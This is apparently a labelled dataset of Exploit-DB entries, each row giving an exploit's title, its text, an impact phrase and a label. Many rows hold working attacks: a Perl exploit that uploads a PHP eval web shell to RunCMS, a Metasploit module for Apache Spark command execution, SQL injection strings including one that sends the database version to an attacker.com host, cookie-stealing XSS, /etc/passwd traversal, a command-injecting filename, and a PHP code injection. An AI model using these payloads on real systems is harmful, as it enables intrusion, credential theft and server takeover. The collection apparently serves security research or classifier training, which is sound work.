34774,"HotScripts Type PHP Clone Script - 'feedback.php?msg' Cross-Site Scripting source: https://www.securityfocus.com/bid/43519/info  Hotscripts Type PHP Clone Script is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.  An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.   http://www.example.com/hotscriptsclonetypephpscript/feedback.php?msg=""><script>alert(document.cookie);</script>",execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site,1
9132,"RunCMS 1.6.3 - Remote Shell Injection #!/usr/bin/perl  # ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #                                                            # RunCMS <= 1.6.3 ""double ext"" remote shell injection exploit # # ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #                                                             #                                                             # # Note: you may upload files with double extension            # #       FCKEditor must be enabled for users                   # #                                                             #                                          #                                                             # # by staker                                                   # # ------------------------------                              # # mail: staker[at]hotmail[dot]it                              # # url: http://www.runcms.org                                  # # ------------------------------                              # # Discovered on 15 June 2009                                  # # Happy Birthday Irene                                        # # ----------------------------------------------------------- #   use IO::Socket; use LWP::UserAgent;   cronx_us();  my ($host,$path,$username) = @ARGV; my $password = $ARGV[3] || exit; my $filename = ""snippet.jpg.pwl""; # change it this is just an example  shell_up();  sub cronx_us() {                  print ""[*------------------------------------------------------------*]\n"".               ""[* RunCMS <= 1.6.3 (fckeditor) remote shell injection exploit *]\n"".               ""[*------------------------------------------------------------*]\n"".                ""[* Usage: perl web.pl [host] [path] [user] [pass]             *]\n"".               ""[*                                                            *]\n"".               ""[* Options:                                                   *]\n"".               ""[* [host] insert a valid host                                 *]\n"".               ""[* [path] insert a valid RunCMS path                          *]\n"".               ""[* [user] your username                                       *]\n"".               ""[* [pass] your password                                       *]\n"".               ""[*------------------------------------------------------------*]\n""; }  sub login() {              my $LWP = new LWP::UserAgent;          my $post = $LWP->post(http_url($host).""/$path/user.php"",                          [ uname => $username,                            pass  => $password,                            op    => 'login',                           ]) || die $!;      if ($post->as_string =~ /Set-Cookie: (.*)/i) {         return $1;     } }  sub http_url() {          my $string = shift @_ || die($!);              if ($string !~ /^http:\/\/?/i) {        return 'http://'.$string;     }   }   sub shell_up() {            my ($data,$packet,$result);      my $cookie = login();        my $vector = chr(45) x27;      my $socket = new IO::Socket::INET(                                        PeerAddr => $host,                                        PeerPort => 80,                                        Proto    => 'tcp',                                      ) or die $!;                       $data .= $vector.""--uploading\r\n"";      $data .= ""Content-Disposition: form-data; name=\""NewFile\""; filename=\""$filename\""\r\n"";      $data .= ""Content-Type: unknown/unknown\r\n\r\n"";      $data .= ""<?php error_reporting(E_ALL); if(isset(\$_GET['cmd'])){die(eval(stripslashes(\$_GET['cmd'])));} ?>\r\n"";      $data .= $vector.""--uploading--\r\n"";       $packet .= ""POST $path/class/fckeditor/editor/filemanager/upload/php/upload.php HTTP/1.0\r\n"";      $packet .= ""Content-Type: multipart/form-data; boundary="".$vector.""uploading\r\n"";      $packet .= ""Host: $host\r\n"";      $packet .= ""Cookie: $cookie\r\n"";      $packet .= ""User-Agent :Lynx (textmode)\r\n"";      $packet .= ""Content-Length: "".length($data).""\r\n"";      $packet .= ""Connection: Close\r\n\r\n"";      $packet .= $data;       $socket->send($packet);       foreach $result (<$socket>) {                       if ($result =~ /file uploader is disabled/i) {              die(""No access for you..\n"");           }           else {                  print $result;           }          }                 }   __END__  # milw0rm.com [2009-07-13]",information disclosure,1
31520,"AuraCMS 2.3 - Multiple Vulnerabilities Advisory ID: HTB23196 Product: AuraCMS Vendor: AuraCMS Vulnerable Version(s): 2.3 and probably prior Tested Version: 2.3 Advisory Publication:  January 8, 2014  [without technical details] Vendor Notification: January 8, 2014  Vendor Patch: January 30, 2014  Public Disclosure: February 5, 2014  Vulnerability Type: SQL Injection [CWE-89] CVE Reference: CVE-2014-1401 Risk Level: Medium  CVSSv2 Base Score: 6.5 (AV:N/AC:L/Au:S/C:P/I:P/A:P) Solution Status: Fixed by Vendor Discovered and Provided: High-Tech Bridge Security Research Lab ( https://www.htbridge.com/advisory/ )   -----------------------------------------------------------------------------------------------  Advisory Details:  High-Tech Bridge Security Research Lab discovered two SQL injection vulnerabilities in AuraCMS, which can be exploited to alter SQL queries and execute arbitrary SQL commands in application's database.   1) Multiple SQL Injection Vulnerabilities in AuraCMS: CVE-2014-1401  1.1 The vulnerability exists due to insufficient validation of ""search"" HTTP GET parameter passed to ""/index.php"" script. A remote authenticated attacker can execute arbitrary SQL commands in application's database.  The exploitation example below displays version of MySQL server:  http://[host]/index.php?mod=content&action=search&search=1%27%29%2f**%2funion%2f**%2fselect%201,version%28%29,3,4,5,6,7,8,9,10,11,12,13,14,15%20--%202   1.2 The vulnerability exists due to insufficient validation of ""CLIENT_IP"", ""X_FORWARDED_FOR"", ""X_FORWARDED"", ""FORWARDED_FOR"", ""FORWARDED"" HTTP headers in ""/index.php"" script. A remote authenticated attacker can execute arbitrary SQL commands in application's database.  The exploitation example below displays version of MySQL server:   GET / HTTP/1.1 CLIENT_IP: '),('',(select load_file(CONCAT(CHAR(92),CHAR(92),(select version()),CHAR(46),CHAR(97),CHAR(116),CHAR(116),CHAR(97),CHAR(99),CHAR(107),CHAR(101),CHAR(114),CHAR(46),CHAR(99),CHAR(111),CHAR(109),CHAR(92),CHAR(102),CHAR(111),CHAR(111),CHAR(98),CHAR(97),CHAR(114))))) -- 2   -----------------------------------------------------------------------------------------------  Solution:  Fixed by vendor on January 30, 2014 directly in the source code without version modification/new release. Update to the version 2.3 released after January 30, 2014.  More Information: https://github.com/auracms/AuraCMS/commit/4fe9d0d31a32df392f4d6ced8e5c25ed4af19ade  -----------------------------------------------------------------------------------------------  References:  [1] High-Tech Bridge Advisory HTB23196 - https://www.htbridge.com/advisory/HTB23196 - Multiple SQL Injection Vulnerabilities in AuraCMS. [2] AuraCMS - http://auracms.org - AuraCMS is an open source software that will let you manage content of your website. [3] Common Vulnerabilities and Exposures (CVE) - http://cve.mitre.org/ - international in scope and free for public use, CVE® is a dictionary of publicly known information security vulnerabilities and exposures. [4] Common Weakness Enumeration (CWE) - http://cwe.mitre.org - targeted to developers and security practitioners, CWE is a formal list of software weakness types. [5] ImmuniWeb® - http://www.htbridge.com/immuniweb/ - is High-Tech Bridge's proprietary web application security assessment solution with SaaS delivery model that combines manual and automated vulnerability testing.  -----------------------------------------------------------------------------------------------  Disclaimer: The information provided in this Advisory is provided ""as is"" and without any warranty of any kind. Details of this Advisory may be updated in order to provide as accurate information as possible. The latest version of the Advisory is available on web page [1] in the References.",execute arbitrary SQL commands in application's database,1
34437,Portable Document Format - Specification Signature Collision source: https://www.securityfocus.com/bid/42377/info  The Portable Document Format (PDF) specification is prone to a signature-collision attack when signing PDF documents.  An attacker can exploit this issue to create PDF documents containing forged signatures. Successfully exploiting this issue will result in the application accepting the signature of a document as valid when it is not. This may result in a false sense of security; other attacks are also possible.  All products conforming to the specification for signing PDF documents are affected by this issue.   https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/34437.tar.gz,the application accepting the signature of a document as valid when it is not,1
24846,"phpGroupWare 0.9.x - 'viewticket_details.php?ticket_id' SQL Injection source: https://www.securityfocus.com/bid/11952/info   Reportedly PHPGroupWare contains multiple input validation vulnerabilities; it is prone to multiple SQL injection and cross-site scripting issues. These issues are all due to a failure of the application to properly sanitize user-supplied input.   The SQL injection issues may allow a remote attacker to manipulate query logic, potentially leading to unauthorized access to sensitive information such as the administrator password hash or corruption of database data. SQL injection attacks may also potentially be used to exploit latent vulnerabilities in the underlying database implementation.   The cross-site scripting issues could permit a remote attacker to create a malicious link to the vulnerable application that includes hostile HTML and script code. If this link were followed, the hostile code may be rendered in the web browser of the victim user. This would occur in the security context of the affected web site and may allow for theft of cookie-based authentication credentials or other attacks.   These issues were identified in PHPGroupWare 0.9.16.003, however, it is possible that other versions are affected as well.   http://www.example.com/phpgroupware/tts/viewticket_details.php?ticket_id=355[SQL_QUERY]",unauthorized access to sensitive information such as the administrator password hash or corruption of database data,1
37645,"OrderSys 1.6.4 - Multiple SQL Injections / Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/55147/info  OrderSys is prone to multiple SQL-injection vulnerabilities and multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied input.  Exploiting these vulnerabilities could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  OrderSys 1.6.4 is vulnerable; other versions may also be affected.   http://example.com/ordering/items.php?smenu_1=-1+AND+(SELECT+1+FROM+(SELECT+2)a+WHERE+1%3Dsleep(25))--+1&sterm_1=3&sbool=AND&smenu_2=Name&sterm_2=3&order_1=ASC&order_2=ASC&sort_1=3&sort_2=3 http://example.com/ordering/vendors.php?smenu_1=-1+AND+(SELECT+1+FROM+(SELECT+2)a+WHERE+1%3Dsleep(25))--+1&sterm_1=3&sbool=AND&smenu_2=Name&sterm_2=3&order_1=ASC&order_2=ASC&sort_1=3&sort_2=3&submit_find=Find http://example.com/ordering/items.php?page='%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Enetsparker(0x0007B1)%3C/script%3E&where_condition=3&order_condition=name%20ASC http://example.com/ordering/vendors.php/%22%20stYle=%22x:expre/**/ssion(netsparker(9)) http://example.com/ordering/items.php/%22%20stYle=%22x:expre/**/ssion(netsparker(9)) http://example.com/ordering/orders.php/%22%20stYle=%22x:expre/**/ssion(netsparker(9)) http://example.com/ordering/interface_creator/index_short.php?table_name=item&function=details&where_field='%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Enetsparker(0x0008F1)%3C/script%3E&where_value=279 http://example.com/ordering/interface_creator/index_short.php?table_name=vendor&function=search&where_clause='%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Enetsparker(0x000F5B)%3C/script%3E&page=0&order=Name&order_type=DESC http://example.com/ordering/interface_creator/index_short.php?table_name=vendor&function=search&where_clause=3&page='%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Enetsparker(0x000F79)%3C/script%3E&order=Name&order_type=DESC http://example.com/ordering/interface_creator/login.php?function='%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Enetsparker(0x0008F4)%3C/script%3E&go_to=(http%3A%2F%2Fubuntu%2Ftargets%2Fordersys%2Fordering%2Fadmin.php) http://example.com/ordering/interface_creator/login.php?function=admin&go_to='%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Enetsparker(0x000902)%3C/script%3E http://example.com/ordering/interface_creator/?function=search&where_clause='%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Enetsparker(0x000C70)%3C/script%3E&page=0&table_name=vendor http://example.com/ordering/interface_creator/?function=search&where_clause=3&page='%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Enetsparker(0x000C96)%3C/script%3E&table_name=vendor http://example.com/ordering/interface_creator/index_long.php?table_name=vendor&function=search&where_clause='%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Enetsparker(0x000B34)%3C/script%3E&page=0&order=Name&order_type=DESC http://example.com/ordering/interface_creator/index_long.php?table_name=vendor&function=search&where_clause=3&page='%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Enetsparker(0x000B3F)%3C/script%3E&order=Name&order_type=DESC",fails to sufficiently sanitize user-supplied input,1
45925,"Apache Spark - (Unauthenticated) Command Execution (Metasploit) ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  class MetasploitModule < Msf::Exploit::Remote   Rank = ExcellentRanking    include Msf::Exploit::Remote::HttpClient   include Msf::Exploit::Remote::HttpServer    def initialize(info = {})     super(update_info(info,       'Name'           => 'Apache Spark Unauthenticated Command Execution',       'Description'    => %q{           This module exploits an unauthenticated command execution vulnerability in Apache Spark with standalone cluster mode through REST API.           It uses the function CreateSubmissionRequest to submit a malious java class and trigger it.       },       'License'        => MSF_LICENSE,       'Author'         =>         [           'aRe00t',                            # Proof of concept           'Green-m <greenm.xxoo[at]gmail.com>' # Metasploit module         ],       'References'     =>         [           ['URL', 'https://www.jianshu.com/p/a080cb323832'],           ['URL', 'https://github.com/vulhub/vulhub/tree/master/spark/unacc']         ],       'Platform'       => 'java',       'Arch'           => [ARCH_JAVA],       'Targets'        =>         [           ['Automatic', {}]         ],       'Privileged'     => false,       'DisclosureDate' => 'Dec 12 2017',       'DefaultTarget'  => 0,       'Notes'          =>         {           'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS],           'Stability'   => [ CRASH_SAFE ],           'Reliability' => [ REPEATABLE_SESSION]         }     ))      register_options [       Opt::RPORT(6066),       OptInt.new('HTTPDELAY', [true, 'Number of seconds the web server will wait before termination', 10])     ]    end    def check     return CheckCode::Detected if get_version     CheckCode::Unknown   end    def primer     path = service.resources.keys[0]     binding_ip = srvhost_addr      proto = datastore['SSL'] ? 'https' : 'http'     payload_uri = ""#{proto}://#{binding_ip}:#{datastore['SRVPORT']}/#{path}""      send_payload(payload_uri)   end    def exploit     fail_with(Failure::Unknown, ""Something went horribly wrong and we couldn't continue to exploit."") unless get_version      vprint_status(""Generating payload ..."")     @pl = generate_payload.encoded_jar(random:true)     print_error(""Failed to generate the payload."") unless @pl      print_status(""Starting up our web service ..."")     Timeout.timeout(datastore['HTTPDELAY']) { super }   rescue Timeout::Error   end    def get_version     @version = nil      res = send_request_cgi(       'uri'           => normalize_uri(target_uri.path),       'method'        => 'GET'     )      unless res       vprint_bad(""#{peer} - No response. "")       return false     end      if res.code == 401       print_bad(""#{peer} - Authentication required."")       return false     end      unless res.code == 400       return false     end      res_json = res.get_json_document     @version = res_json['serverSparkVersion']      if @version.nil?       vprint_bad(""#{peer} - Cannot parse the response, seems like it's not Spark REST API."")       return false     end      true   end    def send_payload(payload_uri)     rand_appname   = Rex::Text.rand_text_alpha_lower(8..16)      data =     {       ""action""                    => ""CreateSubmissionRequest"",       ""clientSparkVersion""        => @version.to_s,       ""appArgs""                   => [],       ""appResource""               => payload_uri.to_s,       ""environmentVariables""      => {""SPARK_ENV_LOADED"" => ""1""},       ""mainClass""                 => ""#{@pl.substitutions[""metasploit""]}.Payload"",       ""sparkProperties""           =>       {         ""spark.jars""              => payload_uri.to_s,         ""spark.driver.supervise""  => ""false"",         ""spark.app.name""          => rand_appname.to_s,         ""spark.eventLog.enabled""  => ""true"",         ""spark.submit.deployMode"" => ""cluster"",         ""spark.master""            => ""spark://#{rhost}:#{rport}""       }     }      res = send_request_cgi(       'uri'           => normalize_uri(target_uri.path, ""/v1/submissions/create""),       'method'        => 'POST',       'ctype'         => 'application/json;charset=UTF-8',       'data'          => data.to_json     )    end    # Handle incoming requests   def on_request_uri(cli, request)     print_status(""#{rhost}:#{rport} - Sending the payload to the server..."")     send_response(cli, @pl)   end end",command execution,1
41648,"Microsoft Windows - Uniscribe Font Processing Heap Out-of-Bounds Read/Write in 'USP10!AssignGlyphTypes' (MS17-011) Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1023  We have encountered a crash in the Windows Uniscribe user-mode library, in the USP10!AssignGlyphTypes function, while trying to display text using a corrupted font file:  --- (58d0.5ae4): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. eax=0042f2cc ebx=00000001 ecx=00000091 edx=00000091 esi=095c0004 edi=000007e1 eip=75235699 esp=0042ef8c ebp=0042ef98 iopl=0         nv up ei pl nz na po nc cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202 USP10!AssignGlyphTypes+0x79: 75235699 0fb70e          movzx   ecx,word ptr [esi]       ds:002b:095c0004=???? 0:000> kb ChildEBP RetAddr  Args to Child               0042ef98 75233660 0042f2cc 095dfc86 0000f81e USP10!AssignGlyphTypes+0x79 0042f17c 7522f29f 42555347 0042f2e4 0042f2a8 USP10!ApplyFeatures+0x500 0042f1c8 7522f710 00000000 095e0000 095dfc78 USP10!SubstituteOtlGlyphs+0x1bf 0042f204 752213c0 0042f280 0042f2b8 0042f2e4 USP10!SubstituteOtlChars+0x220 0042f480 7521548a 0042f58c 0042f5b8 0042f5a0 USP10!HebrewEngineGetGlyphs+0x690 0042f540 7521253f 0042f58c 0042f5b8 0042f5a0 USP10!ShapingGetGlyphs+0x36a 0042f628 751e5c6f 1b01233b 095b6124 095b6318 USP10!ShlShape+0x2ef 0042f66c 751f167a 1b01233b 095b6124 095b6318 USP10!ScriptShape+0x15f 0042f6cc 751f2b14 00000000 00000000 0042f74c USP10!RenderItemNoFallback+0xfa 0042f6f8 751f2da2 00000000 00000000 0042f74c USP10!RenderItemWithFallback+0x104 0042f71c 751f4339 00000000 0042f74c 095b6124 USP10!RenderItem+0x22 0042f760 751e7a04 000004a0 00000400 1b01233b USP10!ScriptStringAnalyzeGlyphs+0x1e9 0042f778 76ca5465 1b01233b 095b6040 0000000a USP10!ScriptStringAnalyse+0x284 0042f7c4 76ca5172 1b01233b 0042fbac 0000000a LPK!LpkStringAnalyse+0xe5 0042f8c0 76ca1410 1b01233b 00000000 00000000 LPK!LpkCharsetDraw+0x332 0042f8f4 763c18b0 1b01233b 00000000 00000000 LPK!LpkDrawTextEx+0x40 0042f934 763c22bf 1b01233b 000000b0 00000000 USER32!DT_DrawStr+0x13c 0042f980 763c21f2 1b01233b 0042fbac 0042fbc0 USER32!DT_GetLineBreak+0x78 0042fa2c 763c14d4 1b01233b 00000000 0000000a USER32!DrawTextExWorker+0x255 0042fa50 763c2475 1b01233b 0042fbac ffffffff USER32!DrawTextExW+0x1e 0042fa84 013b6a5c 1b01233b 0042fbac ffffffff USER32!DrawTextW+0x4d [...] 0:000> u USP10!AssignGlyphTypes+0x79: 75235699 0fb70e          movzx   ecx,word ptr [esi] 7523569c b8f0ff0000      mov     eax,0FFF0h 752356a1 66214602        and     word ptr [esi+2],ax 752356a5 51              push    ecx 752356a6 8d4d0c          lea     ecx,[ebp+0Ch] 752356a9 e852420000      call    USP10!otlClassDef::getClass (75239900) 752356ae 66094602        or      word ptr [esi+2],ax 752356b2 eb09            jmp     USP10!AssignGlyphTypes+0x9d (752356bd) 0:000> dd esi 095c0004  ???????? ???????? ???????? ???????? 095c0014  ???????? ???????? ???????? ???????? 095c0024  ???????? ???????? ???????? ???????? 095c0034  ???????? ???????? ???????? ???????? 095c0044  ???????? ???????? ???????? ???????? 095c0054  ???????? ???????? ???????? ???????? 095c0064  ???????? ???????? ???????? ???????? 095c0074  ???????? ???????? ???????? ???????? ---  While the immediate crash is caused by an invalid memory read operation, the function subsequently writes to the out-of-bounds memory regions at addresses 0x752356a1 and 0x752356ae, leading to memory corruption and potential remote code execution.  The issue reproduces on Windows 7. It is easiest to reproduce with PageHeap enabled, but it is also possible to observe a crash in a default system configuration. In order to reproduce the problem with the provided samples, it might be necessary to use a custom program which displays all of the font's glyphs at various point sizes.  Attached is an archive with 3 crashing samples.   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41648.zip",crash,1
35386,"Logwatch Log File - Special Characters Privilege Escalation source: https://www.securityfocus.com/bid/46554/info  Logwatch is prone to a local privilege-escalation vulnerability.  Local attackers can exploit this issue execute arbitrary code with superuser privileges. Successful exploits will result in the complete compromise of affected computers. Failed exploit attempts will result in a denial-of-service condition.   % echo ""fake"" > â??/var/log/httpd/fakee;who;access_log.2â??",privilege-escalation,1
36019,Community Server 2007/2008 - 'TagSelector.aspx' Cross-Site Scripting source: https://www.securityfocus.com/bid/49022/info  Community Server is prone to a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied data.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.  Community Server 2007 and 2008 are vulnerable; other versions may also be affected.   http://www.example.com/utility/TagSelector.aspx?TagEditor=[XSS],execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site,1
18976,"PHP 5.3.10 - 'spl_autoload()' Local Denial of Service <?php ##################################################################### ## PHP 5.3.10 spl_autoload() Local Denial of Service ## Tested on Windows 7 64bit, English, Apache, PHP 5.3.10 ## Date: 02/06/2012 ## Local Denial of Service ## Bug discovered by Pr0T3cT10n, <pr0t3ct10n@gmail.com> ## ISRAEL ## http://www.0x31337.net #####################################################################  $buff = str_repeat(""A"",9999); spl_autoload($buff); ?>",Denial of Service,1
37753,"WordPress Plugin Simple Image Manipulator 1.0 - Arbitrary File Download Title: Remote file download in simple-image-manipulator v1.0 wordpress plugin Author: Larry W. Cashdollar, @_larry0 Date: 2015-07-16 Download Site: https://wordpress.org/plugins/simple-image-manipulator Vendor: https://profiles.wordpress.org/kevartpatel/ Vendor Notified: 2015-07-16 Vendor Contact: plugins@wordpress.org Description: Manipulate your wordpress images using slider and tickboxes. Vulnerability: In ./simple-image-manipulator/controller/download.php no checks are made to authenticate user or sanitize input when determining file location:    14  /* Figure out the MIME type | Check in array */  15  $known_mime_types=array(  16         ""pdf"" => ""application/pdf"",  17         ""txt"" => ""text/plain"",  18         ""html"" => ""text/html"",  19         ""htm"" => ""text/html"",  20         ""exe"" => ""application/octet-stream"",  21         ""zip"" => ""application/zip"",  22         ""doc"" => ""application/msword"",  23         ""xls"" => ""application/vnd.ms-excel"",  24         ""ppt"" => ""application/vnd.ms-powerpoint"",  25         ""gif"" => ""image/gif"",  26         ""png"" => ""image/png"",  27         ""jpeg""=> ""image/jpg"",  28         ""jpg"" =>  ""image/jpg"",  29         ""php"" => ""text/plain""  30  );  31   32  if($mime_type==''){  33          $file_extension = strtolower(substr(strrchr($file,"".""),1));  34          if(array_key_exists($file_extension, $known_mime_types)){  35                 $mime_type=$known_mime_types[$file_extension];  36          } else {  37                 $mime_type=""application/force-download"";  38          };  39  };  CVEID: OSVDB: Exploit Code:   • curl -sk ""http://server/wp-content/plugins/./simple-image-manipulator/controller/download.php?filepath=/etc/passwd""",code execution,1
27633,"MyBB 1.10 - 'member.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/17492/info  MyBB is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.   An attacker may leverage this issue to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  Version 1.10 is vulnerable; other versions may also be affected.  http://www.example.com/mybb/member.php?action=do_login&username=[usrname]&password=[pass]&url=""><script>alert(1);</script>",have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site,1
27155,"MyBB 1.0/1.1 - 'index.php' Referrer Cookie SQL Injection source: https://www.securityfocus.com/bid/16443/info  MyBB is prone to an SQL-injection vulnerability.  The vulnerability presents itself when user-supplied input via cookie data is passed to the 'index.php' script.  Successful exploitation can allow an attacker to bypass authentication and gain administrative access to a site. Other attacks may also be possible.  MyBB 1.1.2 and prior versions are reported vulnerable to this issue.   http://www.example.com/index.php?referrer=9999999999'%20UNION%20SELECT%20password,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8, 9,0,1,2,3,4,5,6,7,8,9%20FROM%20mybb_users%20WHERE%20uid=1/*",bypass authentication and gain administrative access to a site,1
30499,RndLabs Babo Violent 2 - Multiple Vulnerabilities source: https://www.securityfocus.com/bid/25329/info  Babo Violent 2 is prone to four vulnerabilities: a format-string issue and three denial-of-service issues.  Successful attacks could allow attackers to execute arbitrary code or crash game servers.   https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/30499.zip,execute arbitrary code or crash game servers,1
37604,"SO Planning 1.32 - Multiple Vulnerabilities SOPlanning - Simple Online Planning Tool multiple vulnerabilities  CVEs: CVE-2014-8673, CVE-2014-8674, CVE-2014-8675, CVE-2014-8676, CVE-2014-8677  Vendor: http://www.soplanning.org/ Product: SOPlanning - Simple Online Planning Version affected: 1.32 and prior  Product description: SO Planning is an open source online planning tool completely free, designed to easily plan projects / tasks online, in order to manage and define work for a whole team. (from http://www.soplanning.org/en/index.php)  Advisory introduction: Soplanning version 1.32 is susceptible to multiple vulnerabilities, including SQLi, XSS, path traversal, authentication information disclosure, PHP code injection.  Credit: Huy-Ngoc DAU of Deloitte Conseil, France  ================================ Finding 1: Soplanning multiple SQL injection vulnerabilities (CVE-2014-8673) ================================ - SQLi in planning.php The project, user, task filters are prone to SQLi due to lack of user input sanitization.  POC : POST /process/planning.php HTTP/1.1 Host: localhost Connection: keep-alive Content-Length: 141 Cache-Control: max-age=0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36 Content-Type: application/x-www-form-urlencoded Referer: http://localhost/planning.php Accept-Encoding: gzip,deflate,sdch Accept-Language: fr-FR,fr;q=0.8,en-US;q=0.6,en;q=0.4,vi;q=0.2 Cookie: soplanning=[VALID SESSION COOKIE]; inverserUsersProjets=1  filtreGroupeProjet=1&projet_anything=anything') union all select 111,table_name,333,444,555,666,777,888,999 from information_schema.tables#  The query's results can be retrieved by accessing http://localhost/export_csv.php   - order by statement blind SQLi in user_list.php, projets.php, user_groupes.php, groupe_list.php POC: http://localhost/user_list.php?page=1&order=1,1&by= http://localhost/projets.php?order=1,0&by= http://localhost/user_groupes.php?page=1&order=1,(select%20case%20when%20(1=1)%20then%201%20else%201*(select%201%20from%20information_schema.tables)end)=1&by= http://localhost/groupe_list.php?page=1&order=1,(select%20case%20when%20(1=0)%20then%201%20else%201*(select%201%20from%20information_schema.tables)end)=1&by=   - triPlanning GET parameter Blind SQLi in process/planning.php POC: http://localhost/process/planning.php?triPlanning=1,1 and http://localhost/process/planning.php?triPlanning=1,0 (don't follow redirection back to ../planning.php where the sanitization is done)  The differences of TRUE and FALSE can be observed by accessing http://localhost/export_pdf.php?debug=1   - SQLi in LIMIT statement in nb_lignes cookie POC: set the following cookie : nb_lignes=20 into outfile '/tmp/poc_soplanning.txt' and visit http://localhost/process/planning.php  Sample file output content: ADM      \N          admin    admin    df5b909019c9b1659e86e0d6bf8da81d6fa3499e   \N          oui               000000  [""users_manage_all"", ""projects_manage_all"", ""projectgroups_manage_all"", ""tasks_modify_all"", ""tasks_view_all_projects"", ""parameters_all""]  [md5]    non        \N   - insecure use of addslashes function to protect against SQLi Soplanning sanitizes user input to protect against SQLi by using PHP addslashes() function. However, this function is known to be unsafe. Instead, mysql_real_escape_string() should be used.  ================================ Finding 2: Soplanning multiple XSS vulnerabilities (CVE-2014-8674) ================================ - XSS via cookie manipulation in unauthenticated mode (nb_mois, nb_lignes) This vulnerable allows for an attacker having physical access to a user's browser even in unauthenticated mode to steal the user's authenticated cookie.  POC: Disconnect active user session At authentication page, set the following cookie: nb_mois=""><script>alert(document.cookie)</script><"" Login with any valid user account, an alert message will show the cookies.   - Stored XSS in calender export functions Export functions offer a ""debug"" mode which outputs HTML instead of formatted content (pdf, ical). This mode can be activated by setting the ""debug"" GET parameter. However, by injecting malicious HTML code into a project name for example, it is possible to conduct XSS attacks.  POC: Create a new project with the name <script>alert(1);</script> Access http://localhost/export_pdf.php?debug=1  ================================ Finding 3: Soplanning authentication hash disclosure via GET URL in ICAL calender sharing function (CVE-2014-8675) ================================ Soplanning allows for an ICAL calendar to be shared/used elsewhere. However, the link is generated statically using authentication information.  Sample generated link: http://localhost/export_ical.php?login=admin&hash=61b9bab17cdab06e759f2d11ee11afab  An offline brute force attack can thus be conducted to find the user's password: hash = md5($user->login . '¤¤' . $user->password);  ================================ Finding 4: Soplanning path traversal in Holidays calender import function (CVE-2014-8676) ================================ If error messages are activated, the vulnerability allows to detect existence of a remote arbitrary file.  POC: http://localhost/process/feries.php?fichier=../../../../../../../etc/passwd  Sample error output when file does not exist: Warning: file_get_contents(../../holidays/../../etc/passwd) [function.file-get-contents]: failed to open stream: No such file or directory in /[PATH]/includes/class_vcalendar.inc on line 1665  However, it is not possible to retrieve file content or conduct further attack using this vulnerability.  ================================ Finding 5: Soplanning PHP code injection in installation process (CVE-2014-8677) ================================ The installation process is prone to PHP code execution vulnerability.  POC:  - Go to http://localhost/install - Enter valid database credentials and host information. The database name is as follows :  so';phpinfo();// - The next page will show the phpinfo() results  It should be noted that in order for the attack to work, the attacker must prepare his own database server and the database user must either have access to a real database named ""so';phpinfo();//"", or have privileges to create any database.  For installed instances of Soplanning, the attack is also possible (i.e. the installing interface is accessible) if: - PHP version is older than 5.2 - Configured database server is (temporarily or not) down - The directory smarty/templates_c is not writable   ================================  Timeline: 03/08/2014 - Vulnerability discovered 11/08/2014 - Vendor notified 14/08/2014 - Vendor confirmed 09/09/2014 - Patch released  References: Soplanning changelog : http://www.soplanning.org/en/download.php   About Deloitte: Deloitte refers to one or more of Deloitte Touche Tohmatsu Limited, a UK private company limited by guarantee, and its network of member firms, each of which is a legally separate and independent entity. Please see www.deloitte.com/about for a detailed description of the legal structure of Deloitte Touche Tohmatsu Limited and its member firms. In France, Deloitte SAS is the member firm of Deloitte Touche Tohmatsu Limited, and professional services are provided by its subsidiaries and affiliates. Our Enterprise Risk Services practice is made up of over 11,000 professionals providing services relating to security, privacy & resilience; data governance and analytics; information and controls assurance; risk management technologies; and technology risk & governance. We help organizations build value by taking a ""Risk Intelligent"" approach to managing financial, technology, and business risks.  Huy-Ngoc DAU Senior Consultant | IT Advisory Deloitte Conseil 185, avenue Charles de Gaulle, Neuilly-sur-Seine, 92200, France Mobile: +33 (0)6 70 97 91 95  Tel: +33 